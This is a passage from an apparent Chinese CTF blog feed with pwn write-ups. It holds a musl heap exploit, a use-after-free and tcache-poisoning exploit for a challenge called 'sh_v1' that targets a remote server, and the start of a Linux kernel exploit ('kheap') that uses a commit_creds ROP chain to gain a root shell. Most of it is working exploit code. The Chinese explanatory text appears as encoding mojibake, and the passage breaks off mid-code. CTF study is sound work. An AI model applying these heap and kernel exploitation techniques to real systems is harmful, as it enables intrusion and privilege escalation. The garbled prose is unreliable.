content1</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;option:&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;size:&#x27;</span>, <span class="hljs-built_in">str</span>(size0).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;name:&#x27;</span>, content0)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;size:&#x27;</span>, <span class="hljs-built_in">str</span>(size1).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;content:&#x27;</span>, content1)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find</span>(<span class="hljs-params">size, content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;option:&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;size:&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;name:&#x27;</span>, content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">size, content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;option:&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;size:&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;name:&#x27;</span>, content)<br><br><span class="hljs-comment">#ç”±äºæœ¬åœ°çš„groupæ²¡æœ‰åœ¨libcé™„è¿‘çš„ï¼Œæ‰€ä»¥äº‹å…ˆåˆ†é…å¤§é‡çš„chunkï¼Œè®©groupåˆ†é…åˆ°libcé™„è¿‘</span><br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    add(<span class="hljs-number">0x200</span>, <span class="hljs-string">b&#x27;aaaaaaaa\n&#x27;</span>, <span class="hljs-number">0x200</span>, <span class="hljs-string">b&#x27;a\n&#x27;</span>)<br><br>add(<span class="hljs-number">0x38</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x38</span>, <span class="hljs-number">0x38</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x38</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;option:&#x27;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br><br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    find(<span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;a\n&#x27;</span>)<br><br>add(<span class="hljs-number">0x38</span>, <span class="hljs-string">b&#x27;b&#x27;</span> * <span class="hljs-number">0x38</span>, <span class="hljs-number">0x28</span>, <span class="hljs-string">b&#x27;b&#x27;</span> * <span class="hljs-number">0x28</span>)<br>add(<span class="hljs-number">0x38</span>, <span class="hljs-string">b&#x27;c&#x27;</span> * <span class="hljs-number">0x38</span>, <span class="hljs-number">0x38</span>, <span class="hljs-string">b&#x27;c&#x27;</span> * <span class="hljs-number">0x38</span>)<br>delete(<span class="hljs-number">0x38</span>, <span class="hljs-string">b&#x27;b&#x27;</span> * <span class="hljs-number">0x38</span>)<br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    find(<span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;a\n&#x27;</span>)<br>add(<span class="hljs-number">0x38</span>, <span class="hljs-string">b&#x27;d&#x27;</span> * <span class="hljs-number">0x38</span>, <span class="hljs-number">0x200</span>, <span class="hljs-string">b&#x27;d\n&#x27;</span>)<br>find(<span class="hljs-number">0x38</span>, <span class="hljs-string">b&#x27;b&#x27;</span> * <span class="hljs-number">0x38</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;0x28:&#x27;</span>)<br><br>elf_base = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    elf_base += <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">2</span>), <span class="hljs-number">16</span>) &lt;&lt; (i * <span class="hljs-number">8</span>)<br>elf_base -= <span class="hljs-number">0x7d10</span><br>libc_base = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    libc_base += <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">2</span>), <span class="hljs-number">16</span>) &lt;&lt; (i * <span class="hljs-number">8</span>)<br>libc_base += <span class="hljs-number">0x1d90</span><br>stdin = libc_base + <span class="hljs-number">0xad180</span><br>stdout = stdin + <span class="hljs-number">0x100</span><br>sys_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>malloc_context = libc_base + <span class="hljs-number">0xad9c0</span><br><span class="hljs-comment"># print(hex(elf_base))</span><br><span class="hljs-comment"># print(hex(libc_base))</span><br><br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    find(<span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;a\n&#x27;</span>)<br><br>payload = p64(elf_base + <span class="hljs-number">0x4fc0</span>) + p64(malloc_context) + p64(<span class="hljs-number">0x38</span>) + p64(<span class="hljs-number">0x28</span>)<br>find(<span class="hljs-number">0x20</span>, payload)<br>find(<span class="hljs-number">0x38</span>, <span class="hljs-string">b&#x27;b&#x27;</span> * <span class="hljs-number">0x38</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;0x28:&#x27;</span>)<br>secret = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    secret += <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">2</span>), <span class="hljs-number">16</span>) &lt;&lt; (i * <span class="hljs-number">8</span>)<br><br>heap_addr = libc_base - <span class="hljs-number">0x6000</span><br>fake_meta = heap_addr + <span class="hljs-number">0x1008</span><br>fake_group = heap_addr + <span class="hljs-number">0x1040</span><br><br><span class="hljs-comment">#è¿™é‡Œæ˜¯ä¼ªé€ metaï¼Œç„¶åå…ˆè®©å…¶queue</span><br>last_idx, freeable, sc, maplen = <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span><br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span> * (<span class="hljs-number">0x1000</span> - <span class="hljs-number">0x40</span>) <br>payload += p64(secret) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(fake_group) + p64(<span class="hljs-number">0</span>) <br>payload += p64((sc &lt;&lt; <span class="hljs-number">6</span>) + <span class="hljs-number">1</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>)<br>payload += p64(fake_meta) + p32(<span class="hljs-number">1</span>) + p32(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;e&#x27;</span> * <span class="hljs-number">0x20</span>, <span class="hljs-number">0x1200</span>, payload + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br><br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>    find(<span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x20</span>)<br><br>payload = p64(elf_base + <span class="hljs-number">0x5fc0</span>) + p64(fake_group + <span class="hljs-number">0x10</span>) + p64(<span class="hljs-number">0x38</span>) + p64(<span class="hljs-number">0x28</span>)<br>add(<span class="hljs-number">0x38</span>, <span class="hljs-string">b&#x27;f&#x27;</span> * <span class="hljs-number">0x38</span>, <span class="hljs-number">0x20</span>, payload)<br>delete(<span class="hljs-number">0x38</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x38</span>)<br><br><span class="hljs-comment">#ä¼ªé€ çš„å¦ä¸€ä¸ªmeta,åœ¨dequeueåè®©å…¶æˆä¸ºé“¾è¡¨å¤´ï¼Œä»¥åç›´æ¥åˆ†é…ç›®æ ‡åœ°å€</span><br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span> * (<span class="hljs-number">0x1000</span> - <span class="hljs-number">0x580</span>) + p64(secret) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> + p64(stdin - <span class="hljs-number">0x10</span>)<br>payload += p32(<span class="hljs-number">0</span>) + p32(<span class="hljs-number">3</span>) + p64((sc &lt;&lt; <span class="hljs-number">6</span>) + <span class="hljs-number">1</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x38</span>, <span class="hljs-string">b&#x27;g&#x27;</span> * <span class="hljs-number">0x38</span>, <span class="hljs-number">0x1200</span>, payload + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>delete(<span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;e&#x27;</span> * <span class="hljs-number">0x20</span>)<br><br><span class="hljs-comment">#åˆ©ç”¨å…ˆå‰ä¼ªé€ çš„metaå·²ç»queue,å†å»ä¿®æ”¹prevå’Œnextï¼Œç„¶ååˆ©ç”¨dequeueæ”»å‡»</span><br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span> * (<span class="hljs-number">0x1000</span> - <span class="hljs-number">0x50</span>) <br>payload += p64(secret) + p64(stdin - <span class="hljs-number">0x18</span>) + p64(heap_addr + <span class="hljs-number">0x2008</span>) + p64(fake_group) + p32(<span class="hljs-number">2</span>) + p32(<span class="hljs-number">0</span>)<br>payload += p64((<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">12</span>)|(sc &lt;&lt; <span class="hljs-number">6</span>)| (<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">5</span>) | <span class="hljs-number">1</span>) + p64(fake_group - <span class="hljs-number">0x10</span>) + p64(<span class="hljs-number">0</span>)<br>payload += p64(fake_meta) + p32(<span class="hljs-number">1</span>) + p32(<span class="hljs-number">0</span>)<br>find(<span class="hljs-number">0x1200</span>, payload + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br><br>payload = p64(elf_base + <span class="hljs-number">0x6fb0</span>) + p64(fake_group + <span class="hljs-number">0x10</span>) + p64(<span class="hljs-number">0x38</span>) + p64(<span class="hljs-number">0x28</span>)<br>add(<span class="hljs-number">0x38</span>, <span class="hljs-string">b&#x27;h&#x27;</span> * <span class="hljs-number">0x38</span>, <span class="hljs-number">0x20</span>, payload)<br><br>delete(<span class="hljs-number">0x38</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x38</span>)<br><br>payload = <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span> + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">6</span> + p64(<span class="hljs-number">1</span>)  + p64(<span class="hljs-number">0</span>) + p64(sys_addr)<br><br>add(<span class="hljs-number">0x38</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x38</span>, <span class="hljs-number">0x80</span>, payload + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br><br>p.sendlineafter(<span class="hljs-string">b&#x27;option:&#x27;</span>, <span class="hljs-string">b&#x27;5&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>â€‹</p><p>å‚è€ƒï¼š<a href="https://bbs.kanxue.com/thread-269533-1.htm#msg_header_h3_8">https://bbs.kanxue.com/thread-269533-1.htm#msg_header_h3_8</a></p><p><a href="https://blog.csdn.net/weixin_45209963/article/details/124423573">https://blog.csdn.net/weixin_45209963/article/details/124423573</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>pwnhub3æœˆå…¬å¼€èµ›&amp;&amp;å†…éƒ¨èµ›</title>
    <link href="/2023/03/14/pwnhub3%E6%9C%88%E5%85%AC%E5%BC%80%E8%B5%9B&amp;&amp;%E5%86%85%E9%83%A8%E8%B5%9B/"/>
    <url>/2023/03/14/pwnhub3%E6%9C%88%E5%85%AC%E5%BC%80%E8%B5%9B&amp;&amp;%E5%86%85%E9%83%A8%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h1 id="sh-v1"><a href="#sh-v1" class="headerlink" title="sh_v1"></a>sh_v1</h1><p>æ¼æ´åœ¨å‘½ä»¤ <strong>ln</strong> ä¸­ï¼Œå®ƒä¼šç›´æ¥å¯¹å †åœ°å€å¤åˆ¶ï¼Œé€ æˆuafã€‚</p><p>è§£é¢˜æ€è·¯ï¼š</p><ul><li>åˆ©ç”¨uafï¼Œä½¿ç”¨geditä¿®æ”¹å·²ç»é‡Šæ”¾çš„chunkä¸­çš„keyï¼Œç„¶ådouble freeã€‚</li><li>ä¿®æ”¹tcacheçš„nextæŒ‡é’ˆï¼Œä½¿å…¶æŒ‡å‘tcacheçš„å¤´ï¼Œä¿®æ”¹0x290çš„æ•°é‡ä¸º7ï¼Œé‡Šæ”¾å®ƒå°±å¯ä»¥å¾—åˆ°unsorted binï¼Œè¿›ä¸€æ­¥æ³„æ¼libcåœ°å€ã€‚</li><li>ç»§ç»­ç¼–è¾‘tcacheçš„å¤´ï¼Œä¿®æ”¹0x210çš„æ•°é‡ä¸º7ï¼Œå¹¶åœ¨ç›¸åº”çš„ä½ç½®å†™å…¥__free_hookã€‚</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;sh_v1.1&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;/home/x/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so&#x27;</span>)<br><span class="hljs-comment">#libc = elf.libc</span><br><span class="hljs-comment">#p = process(&#x27;./sh_v1.1&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;121.40.89.206&#x27;</span>, <span class="hljs-number">34883</span>) <br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_command</span>(<span class="hljs-params">content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt;&gt;&gt;&#x27;</span>, content)<br><br>send_command(<span class="hljs-string">b&#x27;touch flag&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>send_command(<span class="hljs-string">b&#x27;touch flag1&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>send_command(<span class="hljs-string">b&#x27;rm flag1&#x27;</span>)<br><br>send_command(<span class="hljs-string">b&#x27;ln flag flag1&#x27;</span>)<br>send_command(<span class="hljs-string">b&#x27;ln flag flag2&#x27;</span>)<br>send_command(<span class="hljs-string">b&#x27;rm flag&#x27;</span>)<br>send_command(<span class="hljs-string">b&#x27;gedit flag1&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x10</span>)<br>send_command(<span class="hljs-string">b&#x27;rm flag1&#x27;</span>)<br><br>send_command(<span class="hljs-string">b&#x27;cat flag2&#x27;</span>)<br>heap_addr = u64(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>, drop=<span class="hljs-literal">True</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(heap_addr))<br><br>send_command(<span class="hljs-string">b&#x27;touch flag&#x27;</span>)<br>p.sendline(p64(heap_addr - <span class="hljs-number">0x290</span>))<br>send_command(<span class="hljs-string">b&#x27;touch flag1&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br><br>payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">7</span> + p32(<span class="hljs-number">0</span>) + p16(<span class="hljs-number">0</span>) + p16(<span class="hljs-number">7</span>) + p64(<span class="hljs-number">0</span>) + p32(<span class="hljs-number">0</span>) + p16(<span class="hljs-number">0</span>) + p16(<span class="hljs-number">7</span>)<br>send_command(<span class="hljs-string">b&#x27;touch flag3&#x27;</span>)<br>p.sendline(payload)<br><br>send_command(<span class="hljs-string">b&#x27;ln flag3 flag4&#x27;</span>)<br>send_command(<span class="hljs-string">b&#x27;rm flag3&#x27;</span>)<br>send_command(<span class="hljs-string">b&#x27;cat flag4&#x27;</span>)<br>leak_addr = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(leak_addr))<br>malloc_hook = leak_addr - <span class="hljs-number">96</span> - <span class="hljs-number">0x10</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(malloc_hook))<br>libc_base = malloc_hook - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc_base))<br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>sys_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">7</span> + p32(<span class="hljs-number">0</span>) + p16(<span class="hljs-number">0</span>) + p16(<span class="hljs-number">7</span>) + <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x40</span> + <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0xf8</span> + p64(free_hook)<br>send_command(<span class="hljs-string">b&#x27;gedit flag4&#x27;</span>)<br>p.sendline(payload)<br><br>send_command(<span class="hljs-string">b&#x27;touch flag5&#x27;</span>)<br>p.sendline(p64(sys_addr))<br>send_command(<span class="hljs-string">b&#x27;rm flag1&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="kheap"><a href="#kheap" class="headerlink" title="kheap"></a>kheap</h1><p>æ”»å‡»æ€è·¯ï¼š</p><ol><li>ä½¿ç”¨0x10002è¿™ä¸ªé€‰é¡¹æ—¶ç›´æ¥å¤åˆ¶å †åœ°å€ï¼Œé‡Šæ”¾å †å—åselectä¸­å­˜äº†å †åœ°å€ï¼Œé€ æˆuafã€‚</li><li>ä½¿ç”¨seq_fileï¼Œå…¶æ­£å¥½ä¼šä½¿ç”¨0x20å¤§å°çš„å †å—ï¼Œç›´æ¥readå°±å¯ä»¥æ³„æ¼å†…æ ¸åœ°å€ã€‚</li><li>writeä¿®æ”¹seq_operationsçš„å†…å®¹ï¼Œå¹¶ç»™ç›¸åº”çš„å¯„å­˜å™¨å¤åˆ¶æ„é€ ROPï¼Œæœ€åè°ƒç”¨readçš„ç³»ç»Ÿè°ƒç”¨ã€‚</li></ol><p>å®Œæ•´exp</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><br><span class="hljs-type">size_t</span> commit_creds = <span class="hljs-number">0xffffffff810ce710</span>;<br><span class="hljs-type">size_t</span> prepare_kernel_cred = <span class="hljs-number">0xffffffff810cebf0</span>;<br><span class="hljs-type">size_t</span> init_cred = <span class="hljs-number">0xffffffff82c6b920</span>;<br><span class="hljs-type">size_t</span> swapgs_restore_regs_and_return_to_usermode = <span class="hljs-number">0xffffffff81c00fb0</span>;<br><br><span class="hljs-type">size_t</span> add_rsp_0x1a8_ret = <span class="hljs-number">0xffffffff817d1e76</span>;<br><span class="hljs-type">size_t</span> pop_rdi_ret = <span class="hljs-number">0xffffffff8102517a</span>;<br><span class="hljs-type">size_t</span> kernel_offset;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">info</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">size_t</span> idx;<br>    <span class="hljs-type">void</span> *buf;<br>&#125;;<br><br><span class="hljs-type">int</span> kheap_fd, seq_fd;<br><span class="hljs-type">size_t</span> buf[<span class="hljs-number">0x10</span>];<br><br><br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><span class="hljs-type">void</span> <span class="hljs-title function_">save_status</span><span class="hljs-params">()</span><br>&#123;<br>    __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>            <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>            <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>            <span class="hljs-string">&quot;pushf;&quot;</span><br>            <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>            );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] Status has been saved. \n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">bind_core</span><span class="hljs-params">(<span class="hljs-type">int</span> core)</span><br>&#123;<br>    <span class="hljs-type">cpu_set_t</span> cpu_set;<br><br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(core, &amp;cpu_set);<br>    sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] Process binded to core %d\n&quot;</span>, core);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">get_shell</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-keyword">if</span>(getuid())&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] Failed to get the root!\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx)</span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">info</span> <span class="hljs-title">a</span>;</span><br>    a.idx = idx;<br>    ioctl(kheap_fd, <span class="hljs-number">0x10000</span>, &amp;a);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">del</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx)</span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">info</span> <span class="hljs-title">a</span>;</span><br>    a.idx = idx;<br>    ioctl(kheap_fd, <span class="hljs-number">0x10001</span>, &amp;a);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">mov</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx)</span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">info</span> <span class="hljs-title">a</span>;</span><br>    a.idx = idx;<br>    ioctl(kheap_fd, <span class="hljs-number">0x10002</span>, &amp;a);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">gift</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx , <span class="hljs-type">void</span> *buf)</span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">info</span> <span class="hljs-title">a</span> =</span> &#123;idx, buf&#125;;<br>    ioctl(kheap_fd, <span class="hljs-number">0x6666</span>, &amp;a);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    save_status();<br>    bind_core(<span class="hljs-number">0</span>);<br>    <br>    kheap_fd = open(<span class="hljs-string">&quot;/dev/kheap&quot;</span>, <span class="hljs-number">2</span>);<br>    <span class="hljs-keyword">if</span>(kheap_fd &lt; <span 